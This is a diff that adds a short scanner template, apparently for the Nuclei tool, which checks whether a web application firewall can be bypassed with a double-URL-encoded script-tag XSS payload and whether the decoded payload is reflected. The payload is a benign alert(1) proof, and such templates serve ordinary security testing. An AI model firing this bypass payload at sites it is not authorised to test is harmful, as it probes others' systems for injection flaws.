@@ -1,0 +1,13 @@
+id: K70n0s510-xss-waf
+info:
+  name: XSS WAF Bypass (Double Encoding)
+  author: K70n0s510
+  severity: high
+  tags: xss,waf
+http:
+  - method: GET
+    path: ["{{BaseURL}}/?q=%253Cscript%253Ealert(1)%253C%252Fscript%253E"]
+    matchers-condition: and
+    matchers:
+      - type: word
+        words: ["<script>alert(1)</script>"]
